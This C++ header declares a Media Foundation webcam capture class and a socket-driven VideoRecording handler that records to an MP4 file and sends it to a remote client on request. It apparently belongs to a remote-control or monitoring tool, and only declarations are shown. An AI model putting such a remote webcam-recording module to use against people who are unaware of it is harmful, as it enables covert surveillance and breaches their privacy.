#pragma once
#include <atomic>
#include <string>

#include "RequestHandler.hpp"

#include <mfapi.h>
#include <mfidl.h>
#include "Shlwapi.h"
#include "mfreadwrite.h"
#include <mfobjects.h>
#include <mferror.h>
#include <Dbt.h>
#include <ks.h>
#include <ksmedia.h>

#define CLEAN_ATTRIBUTES() if (attributes) { attributes->Release(); attributes = NULL; }for (DWORD i = 0; i < count; i++){if (&devices[i]) { devices[i]->Release(); devices[i] = NULL; }}CoTaskMemFree(devices);return hr;

class Media: public IMFSourceReaderCallback {
    CRITICAL_SECTION criticalSection{};
    long refCount;
    WCHAR *wSymbolicLink;
    UINT32 cchSymbolicLink;
    IMFSourceReader *reader;
public:
    LONG stride;
    int bytePerPixel;
    GUID videoFormat;
    UINT width;
    UINT height;
    WCHAR deviceName[2048];
    BYTE* raw;
    int deviceIndex;
    int deviceCount;

    HRESULT CreateCaptureDevice();
    HRESULT SetSourceReader(IMFActivate *device);
    HRESULT IsMediaTypeSupported(IMFMediaType *pType);
    HRESULT GetDefaultStride(IMFMediaType *pType, LONG *pStride);
    HRESULT Close();
    Media(int index);

    virtual ~Media();

    STDMETHODIMP QueryInterface(REFIID riid, void** ppv) override;
    STDMETHODIMP_(ULONG) AddRef() override {
        return InterlockedIncrement(&refCount);
    }
    STDMETHODIMP_(ULONG) Release() override;
    STDMETHODIMP OnReadSample(HRESULT status, DWORD streamIndex, DWORD streamFlags, LONGLONG timeStamp, IMFSample *sample) override;
    STDMETHODIMP OnEvent(DWORD streamIndex, IMFMediaEvent *event) override;
    STDMETHODIMP OnFlush(DWORD streamIndex) override;

};

class VideoRecording : public FeatureHandler {
public:
    void HandleRequest(SOCKET client_socket, const PacketHeader &header) override;

private:
    constexpr static int REQUEST_KEY = 0x12;
    constexpr static std::string VIDEO_FILENAME = "recording.mp4";
    static HANDLE hThread;
    static DWORD dwThreadID;
    static void StartRecording();
    static void StopRecording();
    static void SendVideoFile(SOCKET client_socket, const PacketHeader &header);
    static Media* media;
    static std::atomic_bool isRecording;
};

template <class T> void SafeRelease(T **ppT)
{
    if (*ppT)
    {
        (*ppT)->Release();
        *ppT = NULL;
    }
}